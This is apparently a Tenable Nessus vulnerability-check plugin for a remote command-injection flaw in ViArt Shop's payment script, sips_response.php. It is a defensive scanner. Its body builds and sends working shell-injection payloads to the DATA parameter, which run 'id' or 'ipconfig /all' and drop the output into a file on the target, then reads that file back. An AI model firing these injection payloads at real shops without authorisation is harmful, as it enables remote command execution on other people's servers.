#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(64293);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2016/05/19 18:10:50 $");

  script_bugtraq_id(55674);
  script_osvdb_id(85747);
  script_xref(name:"EDB-ID", value:"21521");

  script_name(english:"ViArt Shop sips_response.php DATA Parameter Request Parsing Remote Shell Command Execution");
  script_summary(english:"Attempts to execute arbitrary commands");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts an application that allows arbitrary
command execution."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of the ViArt Shop installed on the remote host contains a
flaw that could allow a remote attacker to execute arbitrary commands. 
Input passed to the 'DATA' parameter in 'sips_response.php' is not
properly sanitized before being used to process payment data.  An
attacker could leverage this vulnerability to execute arbitrary commands
on the remote host."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5109.php");
  # http://www.viart.com/patch_for_arbitrary_command_execution_vulnerability.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?c4f6077b");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 4.1 or later, or apply the referenced patch.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"ViArt Shop 4.1 RCE (Linux)");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2012/09/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2012/09/25");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/01/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:viart:viart_shop");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2016 Tenable Network Security, Inc.");

  script_dependencies("viart_shop_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/viart_shop", "www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(
  appname      : "viart_shop",
  port         : port,
  exit_on_fail : TRUE
);
dir = install["dir"];
install_url = build_url(qs:dir+'/', port:port);
vuln = FALSE;

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig /all';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig /all');

cmd_pats = make_array();
cmd_pats['id'] = "uid=[0-9]+.*gid=[0-9]+.*";
cmd_pats['ipconfig /all'] = "Subnet Mask";

token = (SCRIPT_NAME - ".nasl") + "-" + unixtime() + ".txt";

foreach cmd (cmds)
{
  if (cmd == 'ipconfig /all') payload = "  ||" + cmd + '> ' + token +
    "&& dir >>" + token + "||";
  else payload = " echo+`" + cmd + "`+`pwd`>" + token + "||";

  payload = urlencode(
    str      : payload,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789_.!~'-+$`"
  );

  # Send POST request to upload the PHP file
  res = http_send_recv3(
    port         : port,
    method       : "POST",
    item         : dir + '/payments/sips_response.php',
    data         : 'DATA=' + payload,
    add_headers  : make_array("Content-Type",
      "application/x-www-form-urlencoded"),
    exit_on_fail : TRUE
  );

  upload = http_last_sent_request();

  # Test the uploaded file
  check_url = '/payments/' + token;
  res2 = http_send_recv3(
    port         : port,
    method       : "GET",
    item         : dir + check_url,
    exit_on_fail : TRUE
  );

  body = res2[2];
  if (egrep(pattern:cmd_pats[cmd], string:body))
  {
    # Format our reporting output
    if (cmd == 'id')
    {
      path = strstr(body, "/");
      output = body - path;
      path = chomp(path) + "/" + token;
      vuln = TRUE;
      break;
    }
    else
    {
      get_path = strstr(body, "Volume in drive");
      get_dir = egrep(pattern:"Directory of (.+)", string:get_path);
      path = chomp((get_dir - " Directory of ")) + '\\' + token;
      output = strstr(body, "Windows IP") - get_path;
      vuln = TRUE;
      break;
    }
  }
}

if (!vuln) audit(AUDIT_WEB_APP_NOT_AFFECTED, "ViArt Shop", install_url);

if (report_verbosity > 0)
{
  snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
  report =
    '\nNessus was able to verify the issue exists using the following request :' +
    '\n' +
    '\n' + build_url(qs:dir+check_url, port:port) +
    '\n' +
    '\nNote: This file has not been removed by Nessus and will need to be' +
    '\nmanually deleted (' + path + ').' +
    '\n';
  if (report_verbosity > 1)
  {
    report +=
      '\nThis file was created using the following request :' +
      '\n' +
      '\n' + snip +
      '\n' + upload +
      '\n' + snip +
      '\n' +
      '\n' + 'The file uploaded by Nessus executed the command : "'+ cmd +'"'+
      '\nwhich produced the following output :' +
      '\n' +
      '\n' + snip +
      '\n' + chomp(output) +
      '\n' + snip +
      '\n';
  }
  security_hole(port:port, extra:report);
}
else security_hole(port);
